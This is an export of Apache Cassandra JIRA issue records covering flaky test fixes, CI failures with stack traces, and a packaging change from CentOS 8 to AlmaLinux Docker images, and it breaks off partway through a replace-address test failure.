For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;03/Mar/22 06:29;githubbot;600","smiklosovic closed pull request #1468:
URL: https://github.com/apache/cassandra/pull/1468


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 07:30;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-16878,,,,,,,"17/Feb/22 17:21;bernardo.botella;0001-Fix-Flaky-testNoSuchRepairSessionAnticompaction-trunk.patch;https://issues.apache.org/jira/secure/attachment/13040201/0001-Fix-Flaky-testNoSuchRepairSessionAnticompaction-trunk.patch",,,,,1.0,bernardo.botella,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Mar 04 18:47:25 UTC 2022,,,,,,,All,,,,"0|z0z6rc:",9223372036854775807,,,,bereng,ycai,,,Normal,,4.0.0,,https://github.com/apache/cassandra/commit/fd5e2ad74eff61e189c2abe87797c2690a45220c,,,,,,,,,[https://github.com/apache/cassandra/pull/1452/files],,,,,"17/Feb/22 17:25;bernardo.botella;Found a fix for this issue. Can be found here:

[https://github.com/apache/cassandra/pull/1452/files]

 

As a backup, I am also attaching a patch.

[^0001-Fix-Flaky-testNoSuchRepairSessionAnticompaction-trunk.patch]

Problem is that sometimes the session state value changed to FAILED state between the moment it was checked as non failed and the moment it was being updated, leading to an ilegal transition (from FAILED to PREPARED).

The way I was able to repro it was:
* to tell intelliJ to keep running the same test until it failed. It failed always after between 2 and 6 runs. 
* Running a simple bash script until it failed. Same results.

That allowed me to investigate the logs and chase that. After adding the synchronize, I couldn’t make the test fail again. Also, thinking about it, it makes perfect sense to put that block into a synchronized block, as it is reading a variable that is being updated from other threads.;;;","17/Feb/22 17:29;e.dimitrova;Hi [~bernardo.botella],

I just saw you posted a patch but the ticket was still in triage so I moved it to Patch Available to signal people it needs a reviewer. 

Thank you for your work!;;;","23/Feb/22 23:03;yifanc;The code gets fixed was added in 4.0. A patch is needed for the 4.0 branch. [~bernardo.botella], can you also provide a patch to 4.0 branch? ;;;","23/Feb/22 23:48;bernardo.botella;Added
||PR||
|[4.0|https://github.com/apache/cassandra/pull/1468]|
|[trunk|https://github.com/apache/cassandra/pull/1452/files]|

 ;;;","24/Feb/22 00:38;yifanc;Thanks for the patches. The [repeated run|https://app.circleci.com/pipelines/github/yifan-c/cassandra/321/workflows/69e3eaca-8e3e-407f-b427-7125b2ea873f/jobs/2613/steps] of the ""flaky"" test now looks good.

+1 on the patch.;;;","25/Feb/22 09:36;bereng;Dropped a couple comments.;;;","01/Mar/22 16:11;bernardo.botella;Thanks [~bereng] ! I just addressed them. Please let me know any thoughts you may have.;;;","03/Mar/22 06:30;bereng;LGTM +1;;;","03/Mar/22 23:52;yifanc;Starting commit

CI Results:
||Branch||Source||Circle CI||
|cassandra-4.0|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17335-cassandra-4.0-3EE5D631-3BA2-47A0-B74F-D79A5776514F]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17335-cassandra-4.0-3EE5D631-3BA2-47A0-B74F-D79A5776514F]|
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17335-trunk-3EE5D631-3BA2-47A0-B74F-D79A5776514F]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17335-trunk-3EE5D631-3BA2-47A0-B74F-D79A5776514F]|

Both runs look mostly green. ;;;","04/Mar/22 18:47;yifanc;Committed into cassandra-4.0 as [fd5e2ad7|https://github.com/apache/cassandra/commit/fd5e2ad74eff61e189c2abe87797c2690a45220c] and merged into trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
For rpm packaging replace centos8 docker images with almalinux,CASSANDRA-17331,13425866,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,mck,mck,mck,31/Jan/22 22:59,27/May/22 19:25,13/Jul/23 08:40,01/Feb/22 14:48,3.0.26,3.11.12,4.0.2,4.1,4.1-alpha1,,Packaging,,,,0,,"Centos went EOL, and CI started failing today with
{code}
Failed to download metadata for repo 'appstream': Cannot prepare internal mirrorlist: No URLs in mirrorlist
{code}
ref: https://ci-cassandra.apache.org/job/Cassandra-trunk-artifacts/1010/jdk=jdk_1.8_latest,label=cassandra/consoleFull

Switching to almalinux seems one common path forward…",,mck,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,mck,,,,,,,,,,,,,,Packaging -> Package Distribution,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Jan 31 23:19:58 UTC 2022,,,,,,,All,,,,"0|z0z4rk:",9223372036854775807,,,,brandon.williams,,,,Critical,,3.0.26,,https://github.com/apache/cassandra-builds/commit/c29f6802329df0ef40f4a415e9e9fa2ad94c2c7e,,,,,,,,,"local testing of 
{code}
cd cassandra-builds
./build-scripts/cassandra-rpm-packaging.sh trunk 8
{code}
and
{code}
cd cassandra
cassandra_builds_dir=../cassandra-builds ../cassandra-builds/build-scripts/cassandra-artifacts.sh
{code}",,,,,"31/Jan/22 23:01;mck;patch at https://github.com/apache/cassandra-builds/compare/trunk...thelastpickle:mck/17331 ;;;","31/Jan/22 23:19;brandon.williams;+1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - dtest.repair_tests.repair_test.TestRepair.test_dc_parallel_repair,CASSANDRA-17328,13425801,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,31/Jan/22 15:40,10/Feb/23 17:18,13/Jul/23 08:40,10/Feb/23 17:18,3.0.27,,,,,,Consistency/Repair,,,,0,,"Failed 4 times in the last 26 runs. Flakiness: 28%, Stability: 84%
Error Message

cassandra.DriverException: ID mismatch while trying to reprepare (expected b'ba2c66a4f13080265ea718e037637d4a', got b'52faf62235132756a26828817a81168d'). This prepared statement won't work anymore. This usually happens when you run a 'USE...' query after the statement was prepared.",,bereng,xgerman42,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-15252,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Feb 10 17:18:39 UTC 2023,,,,,,,All,,,,"0|z0z4d4:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/ad99d5c3cc24261a970cb58a8002942f8fcd9700,,,,,,,,,Run CI,,,,,"14/Feb/22 13:20;brandon.williams;Circle is being strange, but I've reliably bisected this to CASSANDRA-15252, similar to CASSANDRA-17349.;;;","05/Apr/22 15:52;brandon.williams;[Here|https://app.circleci.com/pipelines/github/driftx/cassandra/430/workflows/63ecee4e-93ab-4dd1-9455-8cd2d983a6bd/jobs/5015] is a repeated run of this test against the same branch as CASSANDRA-17349 since it should fix this issue as well.;;;","06/Apr/22 04:59;bereng;+1;;;","06/Apr/22 11:40;brandon.williams;Committed, thanks.;;;","10/Feb/23 17:14;xgerman42;h1. Seen once, filed 2/10/23
h1.  
h1. Regression

dtest-offheap.repair_tests.repair_test.TestRepair.test_dc_parallel_repair (from Cassandra dtests)
Failing for the past 1 build (Since [#1452|https://ci-cassandra.apache.org/job/Cassandra-trunk/1452/] )
[Took 6 min 31 sec.|https://ci-cassandra.apache.org/job/Cassandra-trunk/1452/testReport/dtest-offheap.repair_tests.repair_test/TestRepair/test_dc_parallel_repair/history]
 
!https://ci-cassandra.apache.org/static/f3f9be2d/images/32x32/health-80plus.png! Failed 3 times in the last 30 runs. Flakiness: 10%, Stability: 90%
h3. Error Message

failed on teardown with ""Unexpected error found in node logs (see stdout for full details). Errors: [[node3] 'ERROR [MemtableReclaimMemory:1] 2023-02-09 17:40:32,769 JVMStabilityInspector.java:68 - Exception in thread Thread[MemtableReclaimMemory:1,5,MemtableReclaimMemory]\njava.lang.AssertionError: null\n\tat org.apache.cassandra.utils.memory.MemtablePool$SubPool.released(MemtablePool.java:194)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.releaseAll(MemtableAllocator.java:153)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.setDiscarded(MemtableAllocator.java:144)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator.setDiscarded(MemtableAllocator.java:95)\n\tat org.apache.cassandra.utils.memory.NativeAllocator.setDiscarded(NativeAllocator.java:205)\n\tat org.apache.cassandra.db.memtable.AbstractAllocatorMemtable.discard(AbstractAllocatorMemtable.java:161)\n\tat org.apache.cassandra.db.ColumnFamilyStore$Flush$1.runMayThrow(ColumnFamilyStore.java:1359)\n\tat org.apache.cassandra.utils.WrappedRunnable.run(WrappedRunnable.java:26)\n\tat org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:133)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)\n\tat java.lang.Thread.run(Thread.java:750)']""
h3. Stacktrace

Unexpected error found in node logs (see stdout for full details). Errors: [[node3] 'ERROR [MemtableReclaimMemory:1] 2023-02-09 17:40:32,769 JVMStabilityInspector.java:68 - Exception in thread Thread[MemtableReclaimMemory:1,5,MemtableReclaimMemory]\njava.lang.AssertionError: null\n\tat org.apache.cassandra.utils.memory.MemtablePool$SubPool.released(MemtablePool.java:194)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.releaseAll(MemtableAllocator.java:153)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.setDiscarded(MemtableAllocator.java:144)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator.setDiscarded(MemtableAllocator.java:95)\n\tat org.apache.cassandra.utils.memory.NativeAllocator.setDiscarded(NativeAllocator.java:205)\n\tat org.apache.cassandra.db.memtable.AbstractAllocatorMemtable.discard(AbstractAllocatorMemtable.java:161)\n\tat org.apache.cassandra.db.ColumnFamilyStore$Flush$1.runMayThrow(ColumnFamilyStore.java:1359)\n\tat org.apache.cassandra.utils.WrappedRunnable.run(WrappedRunnable.java:26)\n\tat org.apache.cassandra.concurrent.ExecutionFailure$1.run(ExecutionFailure.java:133)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)\n\tat java.lang.Thread.run(Thread.java:750)'];;;","10/Feb/23 17:18;brandon.williams;That is CASSANDRA-18159;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - dtest.offline_tools_test.TestOfflineTools.test_sstableverify,CASSANDRA-17327,13425796,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,31/Jan/22 15:16,17/Feb/22 11:37,13/Jul/23 08:40,17/Feb/22 11:37,3.0.27,,,,,,Tool/sstable,,,,0,,"Failed 15 times in the last 16 runs. Flakiness: 13%, Stability: 6%
Error Message

IndexError: list index out of range",,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Feb 17 11:37:49 UTC 2022,,,,,,,All,,,,"0|z0z4c0:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/b00e16a162147c790267432affdb1d8276128119,,,,,,,,,run test repeatedly,,,,,"31/Jan/22 15:17;brandon.williams;Only failing on 3.0;;;","10/Feb/22 22:39;brandon.williams;This doesn't fail in an instance of the jenkins testing docker image, either in isolation, or the offline tools suite.  This is as close as possible to a jenkins instance and still won't reproduce, so this is going to be interesting.;;;","16/Feb/22 22:58;brandon.williams;Apparently 3.0 is just on the cusp of sometimes creating 4 sstables, which causes autocompaction to kick in, resulting in a single sstable.  I have a [branch that disables autocompaction|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17327], and to finally be done with this test here are repeated runs passing for everything: [3.0|https://app.circleci.com/pipelines/github/driftx/cassandra/367/workflows/c9107c4c-e921-4a25-a0f1-a470bccc4434/jobs/4172], [3.11|https://app.circleci.com/pipelines/github/driftx/cassandra/369/workflows/28af769d-05fb-4dae-81c2-084353dd0e2f/jobs/4192], [4.0|https://app.circleci.com/pipelines/github/driftx/cassandra/366/workflows/2a0547f6-f5b7-4261-ab32-5f95ccf57390/jobs/4151], and [trunk|https://app.circleci.com/pipelines/github/driftx/cassandra/368/workflows/e114c12f-8b94-4e54-bdcb-944c4f3c00cb/jobs/4178].;;;","17/Feb/22 08:53;bereng;That totals 400 runs across all branches. +1;;;","17/Feb/22 11:37;brandon.williams;Committed, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: dtest.batch_test.TestBatch.test_batchlog_replay_compatibility_1 (from Cassandra dtests),CASSANDRA-17323,13425471,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,jmckenzie,jmckenzie,28/Jan/22 18:57,14/Feb/22 18:54,13/Jul/23 08:40,14/Feb/22 18:54,,,,,,,Test/dtest/python,,,,0,,"https://ci-cassandra.apache.org/job/Cassandra-3.0/240/testReport/dtest.batch_test/TestBatch/test_batchlog_replay_compatibility_1/

Failed 1 times in the last 29 runs. Flakiness: 3%, Stability: 96%
Error Message
NameError: name 'mk_bman_path' is not defined

{code}
Stacktrace
self = <batch_test.TestBatch object at 0x7f770b9793a0>

    @ported_to_in_jvm('4.0')
    @since('3.0', max_version='3.x')
    def test_batchlog_replay_compatibility_1(self):
        """"""
            @jira_ticket CASSANDRA-9673, test that logged batches still work with a mixed version cluster.
    
            Here we have one 3.0/3.x node and two 2.2 nodes and we send the batch request to the 3.0 node.
            """"""
>       self._batchlog_replay_compatibility_test(0, 1, 'github:apache/cassandra-2.2', 2, 4)

batch_test.py:310: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <batch_test.TestBatch object at 0x7f770b9793a0>, coordinator_idx = 0
current_nodes = 1, previous_version = 'github:apache/cassandra-2.2'
previous_nodes = 2, protocol_version = 4

    def _batchlog_replay_compatibility_test(self, coordinator_idx, current_nodes, previous_version, previous_nodes, protocol_version):
        session = self.prepare_mixed(coordinator_idx, current_nodes, previous_version, previous_nodes,
                                     protocol_version=protocol_version, install_byteman=True)
    
        coordinator = self.cluster.nodelist()[coordinator_idx]
>       coordinator.byteman_submit([mk_bman_path('fail_after_batchlog_write.btm')])
E       NameError: name 'mk_bman_path' is not defined

batch_test.py:380: NameError
{code}",,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Feb 14 18:54:44 UTC 2022,,,,,,,All,,,,"0|z0z2cw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Feb/22 18:54;brandon.williams;My ninja [here|https://github.com/apache/cassandra-dtest/commit/156e268094dc595a5d9147a8869628197cc76934] got this a while back.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove Python 2.x circle tests from default cfg,CASSANDRA-17319,13425318,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,bereng,bereng,28/Jan/22 05:44,27/May/22 19:24,13/Jul/23 08:40,02/Feb/22 06:39,4.1,4.1-alpha1,,,,,Test/dtest/python,,,,0,,During CASSANDRA-17242 we forgot to remove py2 tests from the default circle config file,,bereng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17242,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Jan 28 17:12:01 UTC 2022,,,,,,,All,,,,"0|z0z1ew:",9223372036854775807,,,,brandon.williams,e.dimitrova,,,Normal,,4.1,,"[Here|https://github.com/apache/cassandra/commit/d57d67b536185104e9c9074d08498f5d7f26c9e2] and [here|https://github.com/apache/cassandra/commit/8b15f8f22e8126f527ba0d39b9d13b20577c0192]",,,,,,,,,See comments,,,,,"28/Jan/22 06:14;bereng;[Branch|https://github.com/bereng/cassandra/tree/CASSANDRA-17319-trunk], CI [j11|https://app.circleci.com/pipelines/github/bereng/cassandra/586/workflows/0459cb67-1b2c-4e94-9e3e-b310ed0c258e] & CI [j8|https://app.circleci.com/pipelines/github/bereng/cassandra/586/workflows/145be1f3-c77c-41d4-8634-f53d450d8ac1];;;","28/Jan/22 12:10;brandon.williams;+1;;;","28/Jan/22 17:12;brandon.williams;I added an update to the readme about this, to hopefully prevent me from doing it again.

[branch|https://github.com/driftx/cassandra/tree/CASSANDRA-17319], [j11|https://app.circleci.com/pipelines/github/driftx/cassandra/346/workflows/130a8576-1af0-4684-a5e4-f34f2eb4eaa5], [j8|https://app.circleci.com/pipelines/github/driftx/cassandra/346/workflows/9cdbff70-7f46-412f-8ca7-e83892803e74].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: org.apache.cassandra.db.ScrubTest.testScrubCorruptedCounterRow,CASSANDRA-17314,13425233,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,curlylrt,jmckenzie,jmckenzie,27/Jan/22 17:58,22/Oct/22 11:30,13/Jul/23 08:40,08/Aug/22 13:04,3.0.28,,,,,,Test/unit,,,,0,,"Failed 10 times in the last 14 runs. Flakiness: 61%, Stability: 28%

Error Message
Timeout occurred. Please note the time in the report does not reflect the time until the timeout.

{code}
Stacktrace
junit.framework.AssertionFailedError: Timeout occurred. Please note the time in the report does not reflect the time until the timeout.
	at java.util.Vector.forEach(Vector.java:1277)
	at java.util.Vector.forEach(Vector.java:1277)
	at java.util.Vector.forEach(Vector.java:1277)
	at jdk.nashorn.internal.scripts.Script$3$\^eval\_.:program(<eval>:13)
	at jdk.nashorn.internal.runtime.ScriptFunctionData.invoke(ScriptFunctionData.java:637)
	at jdk.nashorn.internal.runtime.ScriptFunction.invoke(ScriptFunction.java:494)
	at jdk.nashorn.internal.runtime.ScriptRuntime.apply(ScriptRuntime.java:393)
	at jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:449)
	at jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:406)
	at jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:402)
	at jdk.nashorn.api.scripting.NashornScriptEngine.eval(NashornScriptEngine.java:155)
	at javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:264)
	at java.util.Vector.forEach(Vector.java:1277)
{code}",,adelapena,bereng,curlylrt,jmckenzie,,,,,,,,,,,"smiklosovic closed pull request #1707: CASSANDRA-17314 fix org.apache.cassandra.db.ScrubTest.testScrubCorruptedCounterRow te…
URL: https://github.com/apache/cassandra/pull/1707


;22/Oct/22 11:30;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,CASSANDRA-16562,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,curlylrt,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Aug 08 13:04:06 UTC 2022,,,,,,,All,,,,"0|z0z0w8:",9223372036854775807,,,,adelapena,bereng,,,Normal,,3.0 alpha 1,,https://github.com/apache/cassandra/commit/299bfaed350e502541190dd1886942dfbcc3371d,,,,,,,,,https://github.com/apache/cassandra/pull/1707,,,,,"18/May/22 15:51;adelapena;An additional hit on CircleCI: https://app.circleci.com/pipelines/github/adelapena/cassandra/1569/workflows/30de5a88-d34c-42a0-a419-c52015ff5c3b/jobs/16742
;;;","28/Jun/22 18:07;curlylrt;This timeout issue happens since 3.0.17. This can be reproduced by: *ant test-compression -Dtest.name=ScrubTest*

 

Using _git bisect_ found that this [commit|https://github.com/apache/cassandra/commit/34a1d5da58fb8edcad39633084541bb4162f5ede] is the first bad commit for this test.;;;","28/Jun/22 22:56;curlylrt;I have a patch for fixing this issue for 3.0

https://github.com/apache/cassandra/pull/1707

I can't find the submit patch button. [~chovatia.jaydeep@gmail.com] could you please help?;;;","29/Jun/22 12:32;adelapena;[~curlylrt] I've set this as patch available and assigned it to you, if that's ok.;;;","29/Jun/22 16:06;brandon.williams;[Here|https://app.circleci.com/pipelines/github/driftx/cassandra/540/workflows/0dc612e5-8b18-4e53-9cef-947c50f0bdcb] is a CI run with the test [repeated|https://app.circleci.com/pipelines/github/driftx/cassandra/540/workflows/0dc612e5-8b18-4e53-9cef-947c50f0bdcb/jobs/6499].;;;","29/Jun/22 16:21;curlylrt;[~brandon.williams] , can you please try to run the utest-compression tests? This fix should fix the compression version of org.apache.cassandra.db.ScrubTest.testScrubCorruptedCounterRow

Thank you!;;;","29/Jun/22 16:57;brandon.williams;[!https://ci-cassandra.apache.org/job/Cassandra-devbranch/1816/badge/icon!|https://ci-cassandra.apache.org/blue/organizations/jenkins/Cassandra-devbranch/detail/Cassandra-devbranch/1816/pipeline]

Unfortunately we can't yet multiplex a test in Jenkins.;;;","30/Jun/22 12:30;adelapena;Here are some repeated runs of {{ScrubTest}} on CircleCI using compression: [https://app.circleci.com/pipelines/github/adelapena/cassandra/1794/workflows/9d4ebf18-5f3d-40ea-8016-b0834dcd2b6e]

They have been generated with:
{code:java}
.circleci/generate.sh -m \
  -e REPEATED_UTEST_TARGET=test-compression \
  -e REPEATED_UTEST_COUNT=1000 \
  -e REPEATED_UTEST_CLASS=ScrubTest
{code}
They have all succeeded.;;;","18/Jul/22 13:11;adelapena;I'm not very familiarized with the topic but it looks good to me. The failure is easy to reproduce on 3.0, even locally with:
{code}
ant test-compression -Dtest.name=""ScrubTest""
{code}
[The CI run above|https://app.circleci.com/pipelines/github/adelapena/cassandra/1794/workflows/9d4ebf18-5f3d-40ea-8016-b0834dcd2b6e] using the proposed patch looks good. The only failures in that run are those already reported by CASSANDRA-17701 and CASSANDRA-17702.

[Repeated runs for 3.11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1934/workflows/24f7e389-7de4-42ee-9f0d-84e558b71e08] seem to confirm that the problem doesn't affect that branch.;;;","21/Jul/22 23:34;curlylrt;I think this is only broken in 3.0. The fix is mostly borrowed from 3.11/4.0 code. The bug in 3.0 is that when throwing error [here|https://github.com/apache/cassandra/pull/1707/files#diff-34814e77850d8cdcae4e28d7edb14ae7a3052c2e28101ca7c347687fc427670aR122], the checksum is not reset. We need to reset checksum every time we try to compare. 3.11 and 4.0 has the function to calculate the checksum. Also, we need to clear the buffer to make sure the reader doesn't see stale data. 4.0 has similar code [here|https://github.com/apache/cassandra/blob/trunk/src/java/org/apache/cassandra/io/util/CompressedChunkReader.java#L165].;;;","25/Jul/22 14:07;adelapena;I agree, this only affects 3.0. I'm +1 to the changes, now we need the review of a second committer.;;;","08/Aug/22 10:25;bereng;+1;;;","08/Aug/22 13:04;adelapena;Thanks, committed to 3.0 as [299bfaed350e502541190dd1886942dfbcc3371d|https://github.com/apache/cassandra/commit/299bfaed350e502541190dd1886942dfbcc3371d].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
dtest-large.replace_address_test.TestReplaceAddress.test_restart_failed_replace (from Cassandra dtests),CASSANDRA-17312,13425230,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,jmckenzie,jmckenzie,27/Jan/22 17:55,14/Feb/22 15:18,13/Jul/23 08:40,14/Feb/22 15:18,3.0.27,,,,,,Test/dtest/python,,,,0,,"Consistently failing on 3.0.x

https://ci-cassandra.apache.org/job/Cassandra-3.0/240/testReport/dtest-large.replace_address_test/TestReplaceAddress/test_restart_failed_replace_2/

Failed 8 times in the last 16 runs. Flakiness: 73%, Stability: 50%

Error Message
ccmlib.node.TimeoutError: 26 Jan 2022 23:07:02 [replacement] after 90.12/90 seconds Missing: ['Starting listening for CQL clients'] not found in system.log:  Head: INFO  [main] 2022-01-26 23:04:33,906 YamlConfigura  Tail: ...endingRangeCalculator:1] 2022-01-26 23:06:41,472 TokenMetadata.java:226 - Token -3193255413308472407 changing ownership from /127.0.0.3 to /127.0.0.4

{code}
Stacktrace
self = <replace_address_test.TestReplaceAddress object at 0x7f99546197c0>

    @since('2.2')
    @pytest.mark.resource_intensive
    def test_restart_failed_replace(self):
        """"""
